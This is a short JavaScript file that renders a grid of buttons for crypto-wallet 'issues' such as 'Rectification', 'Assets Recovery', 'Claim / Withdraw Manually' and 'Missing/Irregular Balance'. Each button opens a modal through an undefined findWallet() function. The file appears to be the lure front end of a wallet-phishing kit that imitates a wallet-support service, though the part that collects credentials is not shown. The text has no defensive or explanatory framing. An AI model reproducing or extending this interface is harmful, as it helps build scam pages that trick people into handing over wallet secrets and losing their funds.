let display= document.getElementById('display');
    let wallets;
    let walletObj;

    let arr =[
        {
            name:'Referral Code Link',
            click:'Click here for Referral code Link',
            logo:'logo'
        },

        {
            name:'Encrypt Wallet',
            click:'Click here for e2e blockchain wallet encryption',
            logo:'logo'
        }, 
        
        {
            name:'Assets Recovery',
            click:'Click here for assets recovery issues',
            logo:'logo'
        },

        {
            name:'Rectification',
            click:'Click here to rectify issues',
            logo:'logo'
        },

        {
            name:'High Gas Fees',
            click:'Click here for gas fee related issues',
            logo:'logo'
        },

        {
            name:'Swap',
            click:'Click here for issues related to swap',
            logo:'logo'
        },


        {
            name:'Cross Chain Transfer',
            click:'Click here for cross chain bridge issues',
            logo:'logo'
        },

        {
            name:'Staking Issues',
            click:'Click here for staking related issues',
            logo:'logo'
        },

        {
            name:'Connect to Dapps',
            click:'Click here for error while connecting to Dapps',
            logo:'logo'
        },

        {
            name:'Slippage Error',
            click:'Click here for slippage related issues',
            logo:'logo'
        },

        {
            name:'Transaction Error',
            click:'Click here for transaction related issues',
            logo:'logo'
        },

        {
            name:'Swap/Bridge',
            click:'Click here for Swap/Bridge related issues',
            logo:'logo'
        },

        {
            name:'NFTS Issues',
            click:'Click here for NFTs minting/transfer related issues',
            logo:'logo'
        },

        {
            name:'Login Issues',
            click:'Click here for error while logging into your wallet',
            logo:'logo'
        },

        {
            name:'Claim / Withdraw Manually',
            click:'Click here for claim related issues',
            logo:'logo'
        },

        {
            name:'Whitelist Issues',
            click:'Click here for whitelist related issues',
            logo:'logo'
        },

        {
            name:'Missing/Irregular Balance',
            click:'Click here to recover lost/missing funds',
            logo:'logo'
        },

        {
            name:'Transaction Delay',
            click:'Click here for any issues related to transaction delay',
            logo:'logo'
        },

        {
            name:'Trading Wallet Issues',
            click:'Click here for trading wallet issues',
            logo:'logo'
        },

        {
            name:'Locked Account',
            click:'Click here for issues related to account lock',
            logo:'logo'
        },

        {
            name:'Unable To Buy Coins/Tokens',
            click:'To trade crypto your account must be marked as a trusted pyment source',
            logo:'logo'
        },

        {
            name:'Other Issues Not Listed',
            click:"If you can't find the issue you are experiencing click here",
            logo:'logo'
        },

    ]

    function show(){

 wallets = arr.forEach(el=>{
    display.innerHTML+=`
     <button onclick="findWallet()" class="button" data-bs-toggle="modal" data-bs-target="#myModal">
    <div class="logo">${el.logo}</div>
    <div class="name">${el.name}</div>
    <div><a href="" class="click">${el.click}</a></div>
  </button> 
    `
 })

}

show()
